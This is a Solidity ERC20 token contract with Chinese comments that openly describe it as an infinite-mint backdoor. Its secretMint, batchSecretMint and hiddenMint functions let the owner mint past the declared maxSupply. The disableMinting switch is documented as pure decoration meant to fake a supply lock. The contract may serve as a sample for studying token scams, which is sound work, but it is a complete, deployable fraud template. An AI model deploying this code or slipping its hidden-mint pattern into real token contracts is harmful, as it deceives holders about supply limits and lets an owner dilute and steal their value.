// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title MintBackdoorToken
 * @notice 无限铸造后门代币
 * @dev owner可以无限增发，稀释持有者价值
 */
contract MintBackdoorToken is ERC20 {
    address public owner;
    uint256 public maxSupply;
    bool public mintingDisabled;

    event SecretMint(address indexed to, uint256 amount);
    event SupplyDiluted(uint256 oldSupply, uint256 newSupply);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(string memory name, string memory symbol, uint256 initialSupply, uint256 _maxSupply) ERC20(name, symbol) {
        owner = msg.sender;
        maxSupply = _maxSupply;
        _mint(msg.sender, initialSupply);
    }

    /**
     * @notice 后门：无限铸造（绕过maxSupply限制）
     */
    function secretMint(address to, uint256 amount) external onlyOwner {
        uint256 oldSupply = totalSupply();
        _mint(to, amount);
        emit SecretMint(to, amount);
        emit SupplyDiluted(oldSupply, totalSupply());
    }

    /**
     * @notice 批量秘密铸造
     */
    function batchSecretMint(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        for (uint256 i = 0; i < recipients.length; i++) {
            _mint(recipients[i], amounts[i]);
            emit SecretMint(recipients[i], amounts[i]);
        }
    }

    /**
     * @notice 伪装：假装禁用铸造
     */
    function disableMinting() external onlyOwner {
        mintingDisabled = true;
    }

    /**
     * @notice 实际仍可铸造（disableMinting只是装饰）
     */
    function hiddenMint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }
}
